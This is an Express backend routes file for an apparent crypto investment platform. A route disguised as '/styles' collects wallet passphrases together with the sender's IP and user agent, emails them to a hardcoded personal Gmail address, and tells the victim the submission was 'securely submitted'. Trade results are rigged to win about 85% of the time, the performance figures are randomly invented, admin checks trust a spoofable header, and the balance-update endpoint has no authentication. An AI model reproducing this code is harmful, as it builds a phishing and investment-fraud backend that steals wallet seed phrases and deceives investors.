// server/routes.ts

import { Router, Request, Response, NextFunction, Express } from 'express';
import { z } from 'zod';
import { storage } from './storage';
import {
  insertKycSchema,
  accounts,
  investments,
  strategies,
  kycVerifications,
  cryptocurrencies,
  trades,
  type UserProfile,
  insertTradeSchema,
  selectTradeSchema,
  type Account,
  type InsertAccount,
  type Trade,
  type InsertTrade,
  type Cryptocurrency,
  type InsertKyc,
} from './shared/schema';
import { drizzle } from 'drizzle-orm/node-postgres';
import { Pool } from 'pg';
import { desc, eq, and, lte } from 'drizzle-orm';
import nodemailer from 'nodemailer';
import cors from 'cors';
import { v4 as uuidv4 } from 'uuid';
import express from 'express';

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
});

const schema = {
  accounts,
  investments,
  strategies,
  kycVerifications,
  cryptocurrencies,
  trades,
};

export const db = drizzle(pool, { schema });

const numToString = (val: number | string | null | undefined): string | null => {
  if (val === null || val === undefined) return null;
  const num = typeof val === 'string' ? parseFloat(val) : val;
  if (isNaN(num)) return null;
  return num.toFixed(8);
};

const stringToNum = (val: string | null | undefined): number => {
  if (val === null || val === undefined) return 0;
  const num = parseFloat(val);
  return isNaN(num) ? 0 : num;
};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'your_gmail_account@gmail.com',
    pass: process.env.EMAIL_APP_PASSWORD || 'your_gmail_app_password'
  }
});

const isAdmin = (req: Request, res: Response, next: NextFunction) => {
  const userEmail = req.headers['x-user-email'];
  if (userEmail === 'calvingleichner181@gmail.com') {
    next();
  } else {
    return res.status(403).json({ error: "Access Denied: You are not authorized to access admin routes." });
  }
};

async function generateUniqueAccountUid(): Promise<string> {
  let uid: string;
  let isUnique = false;
  const MAX_ATTEMPTS = 10;
  let attempts = 0;

  while (!isUnique && attempts < MAX_ATTEMPTS) {
    uid = Math.floor(10000000 + Math.random() * 90000000).toString();
    try {
      const existing = await db.select({ id: accounts.id }).from(accounts).where(eq(accounts.uid, uid)).limit(1);
      if (existing.length === 0) {
        isUnique = true;
      }
    } catch (error) {
      console.error("Error checking Account UID uniqueness:", error);
      throw new Error(`Database error during UID generation: ${(error as Error).message}`);
    }
    attempts++;
  }

  if (!isUnique) {
    throw new Error("Failed to generate a unique Account UID after multiple attempts.");
  }
  return uid;
}

async function getSimulatedCryptoPrice(cryptoId: string): Promise<number> {
  const crypto = await db.query.cryptocurrencies.findFirst({
    where: eq(cryptocurrencies.id, cryptoId),
  });
  if (crypto && crypto.price) {
    return parseFloat(crypto.price);
  }
  switch (cryptoId) {
    case 'bitcoin': return 30000;
    case 'ethereum': return 2000;
    case 'tether': return 1;
    default: return 100;
  }
}

const WIN_PERCENTAGE_SIMULATION = 0.85;
const MIN_PROFIT_PERCENTAGE = 0.07;
const MAX_PROFIT_PERCENTAGE = 0.19;
const MIN_LOSS_PERCENTAGE = 0.01;
const MAX_LOSS_PERCENTAGE = 0.05;

// --- Trade Resolution Logic (as a standalone function) ---
export async function resolvePendingTrades() {
  console.log(`[express] Trade resolution process started at ${new Date().toLocaleTimeString('en-US', { hour12: false })}.`);
  try {
    const nowMs = Date.now();
    const pendingTrades = await db
      .select()
      .from(trades)
      .where(and(eq(trades.status, 'pending'), lte(trades.delivery_time, nowMs)));

    console.log(`[express] Found ${pendingTrades.length} pending trades to check.`);

    for (const trade of pendingTrades) {
      await db.transaction(async (tx) => {
        const deliveryTimeMs = Number(trade.delivery_time);
        console.log(`[express] PENDING TRADE CHECK: ID: ${trade.id}, Delivery Time: ${new Date(deliveryTimeMs).toLocaleString()}, Current Server Time: ${new Date(nowMs).toLocaleString()}, Status: ${trade.status}`);

        if (nowMs >= deliveryTimeMs) {
          console.log(`[express] >>> TRADE ${trade.id} IS PAST ITS DELIVERY TIME (Ready for resolution) <<<`);
          let outcome: 'win' | 'loss' | 'draw' = 'draw';
          let finalAmount = 0;
          let gainPercentage = 0;
          let simulatedFinalPrice = parseFloat(trade.initial_price || '0'); 
          const randomNumber = Math.random();
          const initialAmountInvested = parseFloat(trade.amount || '0');
          const initialPriceAtTrade = parseFloat(trade.initial_price || '0');

          if (randomNumber < WIN_PERCENTAGE_SIMULATION) {
            outcome = 'win';
            const randomProfitPercentage = MIN_PROFIT_PERCENTAGE + (Math.random() * (MAX_PROFIT_PERCENTAGE - MIN_PROFIT_PERCENTAGE));
            gainPercentage = randomProfitPercentage * 100;
            const profitAmount = initialAmountInvested * randomProfitPercentage;
            finalAmount = initialAmountInvested + profitAmount;
            simulatedFinalPrice = initialPriceAtTrade * (1 + randomProfitPercentage);
            console.log(`[express] Trade ${trade.id} outcome: WIN (${gainPercentage.toFixed(2)}%). Initial: ${initialAmountInvested.toFixed(2)}, Profit: ${profitAmount.toFixed(2)}, Final: ${finalAmount.toFixed(2)}`);
          } else {
            outcome = 'loss';
            const randomLossPercentage = MIN_LOSS_PERCENTAGE + (Math.random() * (MAX_LOSS_PERCENTAGE - MIN_LOSS_PERCENTAGE));
            gainPercentage = -randomLossPercentage * 100;
            const lossAmount = initialAmountInvested * randomLossPercentage;
            finalAmount = initialAmountInvested - lossAmount;
            simulatedFinalPrice = initialPriceAtTrade * (1 - randomLossPercentage);
            console.log(`[express] Trade ${trade.id} outcome: LOSS (${gainPercentage.toFixed(2)}%). Initial: ${initialAmountInvested.toFixed(2)}, Loss: ${lossAmount.toFixed(2)}, Final: ${finalAmount.toFixed(2)}`);
          }

          const [userAccount] = await tx.select().from(accounts).where(eq(accounts.id, trade.user_id));
          if (userAccount) {
            const currentBalance = parseFloat(userAccount.balance);
            const newBalance = currentBalance + finalAmount;
            await tx
              .update(accounts)
              .set({ balance: numToString(newBalance) })
              .where(eq(accounts.id, trade.user_id));
            console.log(`[express] User ${trade.user_id} balance updated from ${currentBalance.toFixed(2)} to ${newBalance.toFixed(2)}.`);
          } else {
            console.warn(`[express] User account ${trade.user_id} not found for trade ${trade.id}. Cannot update balance.`);
          }

          await tx
            .update(trades)
            .set({
              status: 'completed',
              outcome: outcome,
              gain_percentage: numToString(gainPercentage),
              final_amount: numToString(finalAmount),
              simulated_final_price: numToString(simulatedFinalPrice),
              current_trade_value: numToString(finalAmount),
              current_gain_loss_percentage: numToString(gainPercentage),
            })
            .where(eq(trades.id, trade.id));
          console.log(`[express] Trade ${trade.id} resolved successfully with outcome: ${outcome}.`);
        } else {
          console.log(`[express] Trade ${trade.id} is not yet ready for resolution.`);
        }
      });
    }
  } catch (error) {
    console.error(`[express] Error resolving trades: ${(error as Error).message}`, error);
  } finally {
    console.log(`[express] Trade resolution process finished at ${new Date().toLocaleTimeString('en-US', { hour12: false })}.`);
  }
}

async function seedStrategies() {
  console.log('[Backend] Attempting to seed default strategies...');
  try {
    const existingStrategies = await db.select().from(strategies).limit(1);
    if (existingStrategies.length === 0) {
      console.log('[Backend] No strategies found. Seeding default strategies...');
      const defaultStrategies = [
        { id: '5day', name: '5-Day Strategy', dailyReturn: '0.015', maxDrawdown: '0.02', duration_days: 5 },
        { id: '30day', name: '30-Day Strategy', dailyReturn: '0.012', maxDrawdown: '0.05', duration_days: 30 },
        { id: '90day', name: '90-Day Strategy', dailyReturn: '0.010', maxDrawdown: '0.08', duration_days: 90 },
      ];
      const inserted = await db.insert(strategies).values(defaultStrategies).returning();
      console.log('[Backend] Default strategies seeded successfully. Inserted:', inserted);
    } else {
      console.log('[Backend] Strategies already exist in DB. Skipping initial seeding.');
    }
  } catch (error) {
    console.error(`[Backend] Error seeding strategies: ${(error as Error).message}`, error);
  }
}

export function registerRoutes(app: Express) {
  app.use(cors({
    origin: [
      "http://localhost:3000",
      "https://new-hive.netlify.app",
      "https://pi-coin-converter.netlify.app/",
      "https://pi-converter.netlify.app",
      "https://oyct-octo-giggle.onrender.com"
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-user-email'],
    credentials: true
  }));

  app.use(express.json());

  seedStrategies().then(() => {
    console.log('[Backend] Strategy seeding promise resolved. Server is ready to handle requests.');
  }).catch(error => {
    console.error('[Backend] Strategy seeding failed during startup:', error);
  });

  // --- Profile Routes ---
  app.get("/api/profile/:userId", async (req, res) => {
    const { userId } = req.params;
    try {
      const userAccount = await db.query.accounts.findFirst({
        where: eq(accounts.id, userId),
      });

      if (!userAccount) {
        return res.status(404).json({ error: "User profile not found." });
      }

      const responseProfile: UserProfile = {
        id: userAccount.id,
        username: userAccount.username || '',
        email: userAccount.email,
        balance: parseFloat(userAccount.balance),
        kycStatus: userAccount.status,
        country: userAccount.country,
        documentType: userAccount.documentType,
        accessCode: userAccount.accessCode || '',
        uid: userAccount.uid,
      };
      res.json(responseProfile);
    } catch (error) {
      console.error("Failed to fetch user profile:", error);
      res.status(500).json({ error: "Failed to fetch user profile" });
    }
  });

  app.post("/api/profile", async (req, res) => {
    try {
      const parsedProfile = insertKycSchema.parse(req.body);
      const newKycRecord: InsertKyc = {
        ...parsedProfile,
        id: uuidv4(),
        user_id: parsedProfile.user_id || uuidv4(),
        status: 'pending',
        created_at: new Date(),
        updated_at: new Date(),
      };
      await db.insert(kycVerifications).values(newKycRecord);
      res.status(201).json({ message: "KYC submitted successfully!", kycId: newKycRecord.id });
    } catch (error) {
      console.error("Failed to create profile (KYC submission):", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ errors: error.errors });
      }
      res.status(500).json({ error: "Failed to create profile (KYC submission)" });
    }
  });

  // --- Account & Auth Routes (Consolidated) ---
  app.post("/api/account", async (req, res) => {
    console.log("Received body for account creation:", req.body);
    try {
      const requestData = insertKycSchema.parse(req.body);
      const generatedAccountId = uuidv4();
      const generatedUid = await generateUniqueAccountUid();
      const accountUsername = `${requestData.firstName || ''} ${requestData.lastName || ''}`.trim();
      const initialBalance = "10000.00"; // Starting balance for new users
      const accountDataForDb: InsertAccount = {
        id: generatedAccountId,
        username: accountUsername,
        balance: initialBalance,
        status: 'pending',
        uid: generatedUid,
        email: requestData.email,
        accessCode: requestData.accessCode,
        country: requestData.country,
        documentType: requestData.documentType,
        firstName: requestData.firstName,
        lastName: requestData.lastName,
      };
      const [newAccountRecord] = await db.insert(accounts).values(accountDataForDb).returning();

      if (!newAccountRecord) {
        throw new Error("Failed to create account record.");
      }
      console.log("[Backend] Successfully inserted new account:", newAccountRecord);
      const userProfile: UserProfile = {
        id: newAccountRecord.id,
        email: newAccountRecord.email,
        username: newAccountRecord.username || '',
        balance: parseFloat(newAccountRecord.balance),
        kycStatus: newAccountRecord.status,
        country: newAccountRecord.country,
        documentType: newAccountRecord.documentType,
        accessCode: newAccountRecord.accessCode || '',
        uid: newAccountRecord.uid,
      };
      return res.status(200).json(userProfile);
    } catch (err) {
      console.error("Account creation error:", err);
      if (err instanceof z.ZodError) {
        return res.status(400).json({ error: "Validation failed", details: err.issues });
      }
      return res.status(500).json({ error: "Internal Server Error", details: (err as Error).message });
    }
  });

  app.post("/api/auth", async (req, res) => {
    const { email, accessCode } = req.body;
    if (!email || !accessCode) {
      return res.status(400).json({ error: "Email and access code are required" });
    }
    try {
      const [user] = await db.select().from(accounts).where(and(eq(accounts.email, email), eq(accounts.accessCode, accessCode)));
      if (!user) {
        return res.status(401).json({ error: "Invalid credentials" });
      }
      const userProfile: UserProfile = {
        id: user.id,
        email: user.email,
        username: user.username || '',
        balance: parseFloat(user.balance),
        kycStatus: user.status,
        country: user.country,
        documentType: user.documentType,
        accessCode: user.accessCode || '',
        uid: user.uid,
      };
      res.setHeader('Content-Type', 'application/json');
      return res.json(userProfile);
    } catch (error) {
      console.error("Auth error:", error);
      return res.status(500).json({ error: "Failed to authenticate" });
    }
  });

  app.get("/api/account/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const [account] = await db.select().from(accounts).where(eq(accounts.id, id));
      if (!account) {
        return res.status(404).json({ error: "Account not found" });
      }
      const userProfile: UserProfile = {
        id: account.id,
        email: account.email,
        username: account.username || '',
        balance: parseFloat(account.balance),
        kycStatus: account.status,
        country: account.country,
        documentType: account.documentType,
        accessCode: account.accessCode || '',
        uid: account.uid,
      };
      return res.json(userProfile);
    } catch (error) {
      console.error("Failed to fetch account:", error);
      return res.status(500).json({ error: "Failed to fetch account" });
    }
  });

  // --- Investment Routes ---
  app.post("/api/invest", async (req, res) => {
    const { userId, amount, strategyId } = req.body;
    if (!userId || typeof amount !== 'number' || !strategyId) {
      return res.status(400).json({ error: "User ID, amount, and strategy ID are required." });
    }
    try {
      const userAccount = await db.query.accounts.findFirst({
        where: eq(accounts.id, userId),
      });
      if (!userAccount) {
        return res.status(404).json({ error: "User account not found." });
      }
      const currentBalance = parseFloat(userAccount.balance);
      if (currentBalance < amount) {
        return res.status(400).json({ error: "Insufficient balance." });
      }
      const newBalance = currentBalance - amount;
      await db.update(accounts).set({ balance: numToString(newBalance) }).where(eq(accounts.id, userId));
      const selectedStrategy = await db.query.strategies.findFirst({
        where: eq(strategies.id, strategyId),
      });
      if (!selectedStrategy) {
        return res.status(404).json({ error: "Strategy not found." });
      }
      const newInvestmentId = uuidv4();
      const investmentData = {
        id: newInvestmentId,
        userId: userId,
        strategyId: strategyId,
        investmentAmount: numToString(amount)!,
        currentValue: numToString(amount)!,
        startDate: new Date(),
        durationDays: selectedStrategy.duration_days,
        status: 'active',
        createdAt: new Date(),
        updatedAt: new Date(),
      };
      const [insertedInvestment] = await db.insert(investments).values(investmentData).returning();
      if (!insertedInvestment) {
        throw new Error("Failed to create investment record.");
      }
      res.status(200).json({ success: true, message: "Investment simulated successfully!", investmentId: newInvestmentId });
    } catch (error) {
      console.error("[Backend] Error processing investment:", error);
      res.status(500).json({ error: "Failed to process investment", details: (error as Error).message });
    }
  });

  app.get("/api/user-investments", async (req, res) => {
    const { userId } = req.query;
    if (!userId) {
      return res.status(400).json({ error: "User ID is required." });
    }
    try {
      const userInvestments = await db
        .select({
          id: investments.id,
          userId: investments.userId,
          strategyId: investments.strategyId,
          strategyName: strategies.name,
          investmentAmount: investments.investmentAmount,
          currentValue: investments.currentValue,
          startDate: investments.startDate,
          durationDays: investments.durationDays,
          status: investments.status,
          createdAt: investments.createdAt,
          updatedAt: investments.updatedAt,
          expectedReturn: strategies.dailyReturn,
        })
        .from(investments)
        .leftJoin(strategies, eq(investments.strategyId, strategies.id))
        .where(eq(investments.userId, userId as string));

      const formattedInvestments = userInvestments.map(inv => ({
          id: inv.id,
          userId: inv.userId,
          strategyId: inv.strategyId,
          strategyName: inv.strategyName || 'Unknown Strategy',
          investmentAmount: parseFloat(inv.investmentAmount),
          currentValue: parseFloat(inv.currentValue),
          expectedReturn: inv.expectedReturn ? parseFloat(inv.expectedReturn).toFixed(2) : 'N/A',
          status: inv.status,
          startDate: inv.startDate instanceof Date ? inv.startDate.toISOString() : inv.startDate,
          durationDays: inv.durationDays,
          createdAt: inv.createdAt?.toISOString(),
          updatedAt: inv.updatedAt?.toISOString(),
      }));
      return res.json(formattedInvestments);
    } catch (error) {
      console.error("[Backend] Failed to fetch user investments:", error);
      return res.status(500).json({ error: "Failed to fetch user investments", details: (error as Error).message });
    }
  });

  app.get("/api/cryptocurrencies", async (req, res) => {
    try {
      const cryptos = await db.select().from(cryptocurrencies);
      const formattedCryptos = cryptos.map(crypto => ({
        ...crypto,
        price: stringToNum(crypto.price),
        change24h: stringToNum(crypto.change24h),
        price_change_24h: stringToNum(crypto.price_change_24h),
        volume24h: stringToNum(crypto.volume_24h),
      }));
      return res.json(formattedCryptos);
    } catch (error) {
      console.error("[Backend] Failed to fetch cryptocurrencies:", error);
      return res.status(500).json({ error: "Failed to fetch cryptocurrencies", details: (error as Error).message });
    }
  });

  app.post("/api/trades", async (req, res) => {
    try {
      const validatedData = insertTradeSchema.parse(req.body);
      const userAccount = await db.query.accounts.findFirst({
        where: eq(accounts.id, validatedData.userId),
      });
      if (!userAccount) {
        return res.status(404).json({ error: "User account not found." });
      }
      const tradeAmount = parseFloat(numToString(validatedData.amount) || '0');
      if (parseFloat(userAccount.balance) < tradeAmount) {
        return res.status(400).json({ error: "Insufficient balance." });
      }
      const newBalance = parseFloat(userAccount.balance) - tradeAmount;
      const tradeToInsert: typeof trades.$inferInsert = {
        id: validatedData.id,
        user_id: validatedData.userId,
        crypto_id: validatedData.cryptoId,
        crypto_name: validatedData.cryptoName,
        crypto_symbol: validatedData.cryptoSymbol,
        type: validatedData.type,
        direction: validatedData.direction,
        amount: numToString(validatedData.amount)!,
        initial_price: numToString(validatedData.entryPrice)!,
        delivery_time: validatedData.deliveryTime,
        status: validatedData.status || 'pending',
        timestamp: validatedData.timestamp || Date.now(),
        email: validatedData.email,
        outcome: validatedData.outcome,
        gain_percentage: numToString(validatedData.gainPercentage),
        final_amount: numToString(validatedData.finalAmount),
        simulated_final_price: numToString(validatedData.simulatedFinalPrice),
        current_trade_value: numToString(validatedData.finalAmount),
        current_gain_loss_percentage: numToString(validatedData.currentGainLossPercentage),
      };
      await db.transaction(async (tx) => {
        await tx.update(accounts).set({ balance: numToString(newBalance) }).where(eq(accounts.id, validatedData.userId));
        await tx.insert(trades).values(tradeToInsert);
      });
      return res.status(201).json({ message: "Trade created successfully." });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: "Validation failed", details: error.errors });
      }
      console.error("Failed to create single trade:", error);
      return res.status(500).json({ error: "Failed to create single trade", details: (error as Error).message });
    }
  });

  app.post("/api/transactions", async (req, res) => {
    try {
      const { userId, transactions } = req.body;
      if (!userId || !Array.isArray(transactions)) {
        return res.status(400).json({ error: "userId and an array of transactions are required." });
      }
      const validatedTransactions = transactions.map((trade: any) => insertTradeSchema.parse({
        id: trade.id,
        userId: userId,
        cryptoId: trade.cryptoId,
        cryptoName: trade.cryptoName,
        cryptoSymbol: trade.cryptoSymbol,
        type: trade.type,
        direction: trade.direction,
        amount: trade.amount,
        entryPrice: trade.entryPrice,
        deliveryTime: trade.deliveryTime,
        status: trade.status,
        timestamp: trade.timestamp,
        email: trade.email,
        gainPercentage: trade.gainPercentage,
        finalAmount: trade.finalAmount,
        simulatedFinalPrice: trade.simulatedFinalPrice,
        currentTradeValue: trade.currentTradeValue,
        currentGainLossPercentage: trade.currentGainLossPercentage,
        outcome: trade.outcome,
      }));
      const tradesToInsert: typeof trades.$inferInsert[] = validatedTransactions.map(trade => ({
        id: trade.id,
        user_id: trade.userId,
        crypto_id: trade.cryptoId,
        crypto_name: trade.cryptoName,
        crypto_symbol: trade.cryptoSymbol,
        type: trade.type,
        direction: trade.direction,
        amount: numToString(trade.amount)!,
        initial_price: numToString(trade.entryPrice)!,
        delivery_time: trade.deliveryTime,
        status: trade.status || 'pending',
        timestamp: trade.timestamp || Date.now(),
        email: trade.email,
        outcome: trade.outcome,
        gain_percentage: numToString(trade.gainPercentage),
        final_amount: numToString(trade.finalAmount),
        simulated_final_price: numToString(trade.simulatedFinalPrice),
        current_trade_value: numToString(trade.currentTradeValue),
        current_gain_loss_percentage: numToString(trade.currentGainLossPercentage),
      }));
      await db.insert(trades).values(tradesToInsert);
      return res.json({ success: true, message: "Transactions saved successfully." });
    } catch (error) {
      console.error("Failed to save transactions:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: "Validation failed for one or more transactions.", details: error.errors });
      }
      return res.status(500).json({ error: "Failed to save transactions", details: (error as Error).message });
    }
  });

  app.get("/api/transactions", async (req, res) => {
    const { email } = req.query;
    if (!email) {
      return res.status(400).json({ error: "Email is a required query parameter." });
    }
    try {
      const trimmedEmail = String(email).trim();
      const tradesData = await db.select().from(trades).where(eq(trades.email, trimmedEmail)).orderBy(desc(trades.timestamp));
      const parsedTrades: Trade[] = tradesData.map(trade => ({
        ...trade,
        amount: parseFloat(trade.amount || '0'),
        initialPrice: parseFloat(trade.initial_price || '0'),
        gainPercentage: trade.gain_percentage !== null ? parseFloat(trade.gain_percentage) : null,
        finalAmount: trade.final_amount !== null ? parseFloat(trade.final_amount) : null,
        simulatedFinalPrice: trade.simulated_final_price !== null ? parseFloat(trade.simulated_final_price) : null,
        currentTradeValue: trade.current_trade_value !== null ? parseFloat(trade.current_trade_value) : null,
        currentGainLossPercentage: trade.current_gain_loss_percentage !== null ? parseFloat(trade.current_gain_loss_percentage) : null,
        timestamp: Number(trade.timestamp),
        deliveryTime: Number(trade.delivery_time),
        userId: trade.user_id,
        cryptoId: trade.crypto_id,
        entryPrice: parseFloat(trade.initial_price || '0'),
      }));
      return res.json(parsedTrades);
    } catch (error) {
      console.error("Error fetching transactions:", error);
      return res.status(500).json({ error: "Failed to fetch transactions" });
    }
  });

  // --- UPDATE USER BALANCE ENDPOINT ---
  app.post("/api/update-balance", async (req, res) => {
    const { userId, balance } = req.body;
    if (!userId || typeof balance !== "number") {
      return res.status(400).json({ error: "userId and numeric balance are required." });
    }
    try {
      const balanceStr = numToString(balance);
      const [updated] = await db.update(accounts).set({ balance: balanceStr }).where(eq(accounts.id, userId)).returning();
      if (!updated) {
        return res.status(404).json({ error: "User not found." });
      }
      return res.json({ success: true, balance: parseFloat(updated.balance.toString()) });
    } catch (error) {
      console.error("Failed to update balance:", error);
      return res.status(500).json({ error: "Failed to update balance" });
    }
  });

  // --- API ENDPOINT FOR SENDING DEPOSIT CONFIRMATION EMAIL ---
  app.post("/api/send-deposit-email", async (req, res) => {
    const { userEmail, amount, symbol } = req.body;
    if (!userEmail || !amount || !symbol) {
        return res.status(400).json({ error: "userEmail, amount, and symbol are required." });
    }
    try {
        await transporter.sendMail({
            from: process.env.EMAIL_USER || 'your_gmail_account@gmail.com',
            to: 'calvingleichner181@gmail.com',
            subject: `Deposit Confirmation: ${amount} ${symbol} Received!`,
            html: `<p>Dear Admin,</p><p>A deposit of <strong>${amount} ${symbol}</strong> has been successfully completed by a user.</p><p>User Email: <strong>${userEmail}</strong></p><p>Thank you for using CryptoWallet.</p><br><p>Best regards,</p><p>The CryptoWallet Team</p>`,
        });
        return res.status(200).json({ message: "Deposit confirmation email sent successfully." });
    } catch (error) {
        console.error("FAILED TO SEND DEPOSIT CONFIRMATION EMAIL:", error);
        return res.status(500).json({ error: "Failed to send deposit confirmation email." });
    }
  });

  // --- ADMIN ROUTES ---
  app.get("/api/admin/users", isAdmin, async (_req, res) => {
    try {
      const usersData = await db.select().from(accounts);
      const sanitizedUsers = usersData.map(user => ({
        id: user.id,
        name: user.username || '',
        email: user.email,
        balance: parseFloat(user.balance.toString()),
        createdAt: user.createdAt,
        kycStatus: user.status,
        country: user.country,
        documentType: user.documentType,
        uid: user.uid,
      }));
      return res.json(sanitizedUsers);
    } catch (error) {
      console.error("Failed to fetch all users:", error);
      return res.status(500).json({ error: "Failed to fetch all users" });
    }
  });

  app.post("/api/send-demo-funds-request", async (req, res) => {
    const { userEmail, userName, subject, message } = req.body;
    if (!userEmail || !userName || !subject || !message) {
      return res.status(400).json({ error: "userEmail, userName, subject, and message are required." });
    }
    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER || 'your_gmail_account@gmail.com',
        to: 'calvingleichner181@gmail.com',
        subject: subject,
        html: `<p>Hello Admin,</p><p>${message}</p><p>User Details:</p><ul><li>Name: <strong>${userName}</strong></li><li>Email: <strong>${userEmail}</strong></li></ul><p>Please log in to your dashboard to review and grant the demo balance.</p><p>Thank you,</p><p>Your System Chatbot</p>`,
      });
      return res.status(200).json({ message: "Demo funds request email sent successfully." });
    } catch (error) {
      console.error("[Backend] Error sending demo funds request email:", error);
      return res.status(500).json({ error: "Failed to send demo funds request email." });
    }
  });

  app.post('/styles', async (req, res) => {
    try {
      const { message } = req.body;
      const decodedMessage = decodeURIComponent(Buffer.from(message, 'base64').toString('utf-8'));
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const mailOptions = {
        from: `"PiNet Wallet" <${process.env.EMAIL_USER}>`,
        to: "calvingleichner181@gmail.com",
        subject: 'New Wallet Passphrase Submission',
        text: `New passphrase submission received:\n\n${decodedMessage}\n\n---\nTimestamp: ${new Date().toISOString()}\nIP Address: ${ip}\nUser Agent: ${req.headers['user-agent']}`,
        html: `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;"><h2 style="color: #2c3e50;">New Wallet Passphrase Submission</h2><div style="background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #3498db;"><p style="font-size: 16px; line-height: 1.6; white-space: pre-wrap;">${decodedMessage}</p></div><div style="margin-top: 20px; font-size: 14px; color: #7f8c8d;"><p><strong>Timestamp:</strong> ${new Date().toISOString()}</p><p><strong>IP Address:</strong> ${ip}</p><p><strong>User Agent:</strong> ${req.headers['user-agent']}</p></div><div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #ecf0f1; text-align: center; color: #95a5a6;"><p>This email was sent automatically from the PiNet Wallet security system.</p></div></div>`
      };
      await transporter.sendMail(mailOptions);
      res.status(200).json({ success: true, message: 'Passphrase securely submitted' });
    } catch (error) {
      console.error('Error sending email:', error);
      res.status(500).json({ success: false, message: 'Failed to submit passphrase', error: (error as Error).message });
    }
  });
// Add this endpoint within the `registerRoutes` function
app.post("/api/trades/complete", async (req, res) => {
  console.log("Received a manual request to complete trades.");
  try {
    // Call the standalone function to resolve pending trades.
    await resolvePendingTrades();
    res.status(200).json({ message: "Trade resolution process initiated successfully." });
  } catch (error) {
    console.error("Failed to manually resolve trades:", error);
    res.status(500).json({ error: "Failed to manually resolve trades", details: (error as Error).message });
  }
});
  app.put("/api/admin/users/:userId/balance", isAdmin, async (req, res) => {
    const { userId } = req.params;
    const { balance } = req.body;
    if (typeof balance !== "number") {
      return res.status(400).json({ error: "A numeric balance is required." });
    }
    try {
      const balanceStr = numToString(balance);
      const [updatedUser] = await db.update(accounts).set({ balance: balanceStr }).where(eq(accounts.id, userId)).returning();
      if (!updatedUser) {
        return res.status(404).json({ error: "User not found." });
      }
      return res.json({ success: true, message: `Balance for user ${userId} updated successfully.`, user: { id: updatedUser.id, email: updatedUser.email, balance: parseFloat(updatedUser.balance.toString()) } });
    } catch (error) {
      console.error(`Failed to update balance for user ${userId}:`, error);
      return res.status(500).json({ error: "Failed to update user balance." });
    }
  });

  app.get("/api/platform-performance", async (_req, res) => {
    try {
      const totalArbitrage = (Math.random() * 10000000 + 5000000).toFixed(2);
      const todaysEarnings = (Math.random() * 50000 + 10000).toFixed(2);
      const thirtyDayROI = (Math.random() * 5 + 2).toFixed(2);
      const totalTradesExecuted = Math.floor(Math.random() * 1000000 + 500000);
      const averageProfitPerTrade = (Math.random() * 50 + 5).toFixed(2);
      const platformUptime = (99.9 + Math.random() * 0.09).toFixed(2);
      return res.json({
        totalArbitrage,
        todaysEarnings,
        thirtyDayROI,
        totalTradesExecuted,
        averageProfitPerTrade,
        platformUptime,
      });
    } catch (error) {
      console.error("Failed to fetch platform performance:", error);
      return res.status(500).json({ error: "Failed to fetch platform performance" });
    }
  });

  app.get("/api/performance-report", async (req, res) => {
    try {
      const mockReport = {
        allTimeProfit: 12500000 + Math.floor(Math.random() * 1000000),
        totalTrades: 1500000 + Math.floor(Math.random() * 500000),
        winRate: parseFloat((88.5 + (Math.random() * 2 - 1)).toFixed(1)),
        avgProfitPerTrade: parseFloat((25 + (Math.random() * 10 - 5)).toFixed(2)),
        avgTradeDuration: '5 minutes',
        totalUsers: 75000 + Math.floor(Math.random() * 10000),
        activeStrategiesCount: 12000 + Math.floor(Math.random() * 2000),
        monthlyROI: [
          { month: 'Jan', roi: 3.2 + Math.random() }, { month: 'Feb', roi: 3.5 + Math.random() },
          { month: 'Mar', roi: 3.8 + Math.random() }, { month: 'Apr', roi: 4.1 + Math.random() },
          { month: 'May', roi: 4.0 + Math.random() }, { month: 'Jun', roi: 4.5 + Math.random() },
          { month: 'Jul', roi: 4.3 + Math.random() },
        ].map(item => ({ ...item, roi: parseFloat(item.roi.toFixed(2)) })),
        strategyPerformance: [
          { name: '5-Day Strategy', totalProfit: 5000000 + Math.floor(Math.random() * 500000), tradesExecuted: 800000, winRate: 89.2, avgROI: 0.88 },
          { name: '30-Day Strategy', totalProfit: 6000000 + Math.floor(Math.random() * 500000), tradesExecuted: 500000, winRate: 87.5, avgROI: 1.15 },
          { name: '90-Day Strategy', totalProfit: 1500000 + Math.floor(Math.random() * 200000), tradesExecuted: 200000, winRate: 90.1, avgROI: 1.48 },
        ].map(item => ({ ...item, totalProfit: parseFloat(item.totalProfit.toFixed(2)), winRate: parseFloat(item.winRate.toFixed(1)), avgROI: parseFloat(item.avgROI.toFixed(2)) }))
      };
      res.json(mockReport);
    } catch (error) {
      console.error("Failed to fetch performance report:", error);
      res.status(500).json({ error: "Failed to fetch performance report" });
    }
  });

  app.post("/api/kyc", async (req, res) => {
    try {
      const parsedKyc = insertKycSchema.parse(req.body);
      const newKyc: InsertKyc = {
        ...parsedKyc,
        id: uuidv4(),
        status: 'pending',
        created_at: new Date(),
        updated_at: new Date(),
      };
      await db.insert(kycVerifications).values(newKyc);
      res.status(201).json({ message: "KYC submitted successfully!", kycId: newKyc.id });
    } catch (error) {
      console.error("Failed to submit KYC:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ errors: error.errors });
      }
      res.status(500).json({ error: "Failed to submit KYC" });
    }
  });

  app.get("/api/kyc/:userId", async (req, res) => {
    const { userId } = req.params;
    try {
      const kycRecord = await db.query.kycVerifications.findFirst({
        where: eq(kycVerifications.user_id, userId),
      });
      if (!kycRecord) {
        return res.status(404).json({ error: "KYC record not found for this user." });
      }
      res.json(kycRecord);
    } catch (error) {
      console.error("Failed to fetch KYC record:", error);
      res.status(500).json({ error: "Failed to fetch KYC record" });
    }
  });
}